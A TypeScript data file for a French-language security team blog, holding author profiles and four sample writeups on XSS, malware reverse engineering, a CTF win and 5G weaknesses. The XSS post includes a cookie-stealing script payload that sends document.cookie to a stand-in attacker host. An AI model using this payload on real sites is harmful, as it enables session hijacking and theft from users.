
export interface Author {
  id: string;
  name: string;
  role: string;
  specialty: string;
  avatar: string;
  bio: string;
}

export interface BlogPost {
  id: string;
  title: string;
  slug: string;
  excerpt: string;
  content: string;
  thumbnail: string;
  date: string;
  authorId: string;
  tags: string[];
}

export const authors: Author[] = [
  {
    id: "mamadou",
    name: "Mamadou Diallo",
    role: "Team Lead",
    specialty: "Reverse Engineering",
    avatar: "https://i.pravatar.cc/150?img=11",
    bio: "Expert en reverse engineering avec plus de 8 ans d'expérience, Mamadou dirige l'équipe Guinea Offensive Security depuis sa création."
  },
  {
    id: "fatoumata",
    name: "Fatoumata Camara",
    role: "Security Analyst",
    specialty: "Web Exploitation",
    avatar: "https://i.pravatar.cc/150?img=5",
    bio: "Spécialiste en sécurité des applications web, Fatoumata a découvert plusieurs vulnérabilités critiques dans des applications largement utilisées."
  },
  {
    id: "ibrahim",
    name: "Ibrahim Bah",
    role: "Cryptographer",
    specialty: "Cryptographie",
    avatar: "https://i.pravatar.cc/150?img=12",
    bio: "Ibrahim est expert en cryptographie et a développé plusieurs outils utilisés par la communauté CTF."
  },
  {
    id: "aissatou",
    name: "Aissatou Touré",
    role: "Network Specialist",
    specialty: "Network Security",
    avatar: "https://i.pravatar.cc/150?img=9",
    bio: "Aissatou excelle dans les défis de sécurité réseau et a remporté plusieurs compétitions individuelles de hacking."
  }
];

export const blogPosts: BlogPost[] = [
  {
    id: "1",
    title: "Exploitation d'une vulnérabilité XSS dans une application bancaire",
    slug: "xss-vulnerability-banking-app",
    excerpt: "Comment nous avons découvert et exploité une faille XSS persistante dans une application bancaire majeure en Afrique de l'Ouest.",
    content: `# Exploitation d'une vulnérabilité XSS dans une application bancaire

## Introduction

Dans ce writeup, nous allons vous présenter comment notre équipe a découvert et exploité une vulnérabilité XSS persistante dans l'application web d'une importante banque en Afrique de l'Ouest.

## Découverte initiale

Lors d'un test de pénétration autorisé, nous avons remarqué que le champ de commentaire dans la section de transfert d'argent n'était pas correctement assaini...

## Exploitation

Nous avons utilisé la payload suivante pour démontrer la vulnérabilité:

\`\`\`javascript
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
\`\`\`

## Impact

Cette vulnérabilité aurait pu permettre à un attaquant de:
1. Voler des sessions d'utilisateurs
2. Modifier des transactions
3. Accéder à des informations personnelles

## Correction

Nous avons recommandé l'implémentation d'une validation stricte des entrées et l'utilisation de Content Security Policy (CSP) pour atténuer ce type de vulnérabilités.`,
    thumbnail: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5",
    date: "2024-04-15",
    authorId: "fatoumata",
    tags: ["Web Security", "XSS", "Banking"]
  },
  {
    id: "2",
    title: "Reverse Engineering d'un malware ciblant les infrastructures critiques",
    slug: "reverse-engineering-malware-critical-infrastructure",
    excerpt: "Analyse détaillée d'un malware sophistiqué découvert dans les systèmes d'une infrastructure critique en Afrique.",
    content: `# Reverse Engineering d'un malware ciblant les infrastructures critiques

## Introduction

Ce writeup détaille notre analyse d'un malware sophistiqué découvert dans les systèmes SCADA d'une infrastructure critique.

## Extraction et analyse initiale

Le malware était déguisé en mise à jour de firmware légitime. Nous avons utilisé les outils suivants pour l'analyse:
- IDA Pro
- Ghidra
- Volatility

## Fonctionnalités découvertes

Le malware présentait plusieurs caractéristiques avancées:

1. Communication C2 chiffrée
2. Techniques anti-analyse
3. Persistance via modification du bootloader
4. Capacité à manipuler les systèmes SCADA

## Attribution

Plusieurs indices suggèrent qu'il s'agit d'un acteur étatique, notamment...

## Recommandations

Suite à cette analyse, nous avons recommandé:
1. Mise à jour des procédures de vérification des firmwares
2. Implémentation de monitoring réseau avancé
3. Segmentation renforcée des réseaux OT/IT`,
    thumbnail: "https://images.unsplash.com/photo-1487058792275-0ad4aaf24ca7",
    date: "2024-03-22",
    authorId: "mamadou",
    tags: ["Malware", "Reverse Engineering", "Critical Infrastructure"]
  },
  {
    id: "3",
    title: "Comment nous avons gagné le CTF AfricaHackon 2024",
    slug: "how-we-won-africahackon-ctf-2024",
    excerpt: "Notre approche et stratégies pour remporter la première place au CTF AfricaHackon 2024.",
    content: `# Comment nous avons gagné le CTF AfricaHackon 2024

## La compétition

AfricaHackon est l'une des plus grandes compétitions de cybersécurité en Afrique. Cette année, nous avons affronté plus de 50 équipes de tout le continent.

## Notre préparation

Pendant les semaines précédant la compétition, nous avons:
1. Analysé les challenges des éditions précédentes
2. Pratiqué des CTFs similaires
3. Assigné des rôles spécifiques à chaque membre de l'équipe

## Les challenges clés

### Web Exploitation
Le challenge "Broken Bank" était particulièrement intéressant, impliquant une vulnérabilité IDOR permettant d'accéder aux comptes d'autres utilisateurs...

### Cryptographie
Le challenge "African Cipher" utilisait un algorithme de chiffrement personnalisé basé sur des symboles adinkra traditionnels...

### Forensics
Pour "Memory Lane", nous avons dû analyser un dump mémoire d'un serveur compromis...

## Leçons apprises

1. L'importance de la communication d'équipe
2. La valeur d'une approche méthodique
3. L'avantage de notre diversité de compétences

## Conclusion

Notre victoire à AfricaHackon 2024 marque une étape importante pour la reconnaissance de la cybersécurité guinéenne sur la scène africaine et internationale.`,
    thumbnail: "https://images.unsplash.com/photo-1461749280684-dccba630e2f6",
    date: "2024-02-18",
    authorId: "ibrahim",
    tags: ["CTF", "Competition", "Team Achievement"]
  },
  {
    id: "4",
    title: "Analyse des vulnérabilités dans les réseaux 5G déployés en Afrique",
    slug: "5g-network-vulnerabilities-africa",
    excerpt: "Étude des risques de sécurité spécifiques aux déploiements 5G en Afrique et recommandations pour les opérateurs.",
    content: `# Analyse des vulnérabilités dans les réseaux 5G déployés en Afrique

## Introduction
Avec le déploiement progressif de la 5G en Afrique, de nouvelles préoccupations en matière de sécurité émergent...

## Méthodologie
Nous avons audité les configurations de plusieurs opérateurs télécom et identifié plusieurs problèmes récurrents...

## Vulnérabilités découvertes
1. Configuration par défaut des stations de base
2. Problèmes d'authentification dans le core network
3. Absence de segmentation adéquate
4. Mauvaise implémentation des mécanismes de chiffrement

## Attaques potentielles
Nos tests ont démontré la possibilité de:
- Intercepter le trafic non chiffré
- Usurper l'identité des stations de base
- Provoquer des interruptions de service

## Recommandations
Pour les opérateurs télécom africains, nous recommandons:
1. Révision complète des configurations de sécurité
2. Implémentation de mécanismes d'authentification renforcés
3. Surveillance continue du réseau
4. Formation approfondie des équipes techniques

## Conclusion
Les déploiements 5G en Afrique présentent des défis uniques qui nécessitent une approche adaptée de la sécurité.`,
    thumbnail: "https://images.unsplash.com/photo-1581091226825-a6a2a5aee158",
    date: "2024-04-03",
    authorId: "aissatou",
    tags: ["5G", "Network Security", "Telecom"]
  }
];

// Fonction utilitaire pour obtenir l'auteur d'un post
export const getAuthorByPost = (post: BlogPost): Author | undefined => {
  return authors.find(author => author.id === post.authorId);
};

// Fonction pour obtenir un post par son slug
export const getPostBySlug = (slug: string): BlogPost | undefined => {
  return blogPosts.find(post => post.slug === slug);
};
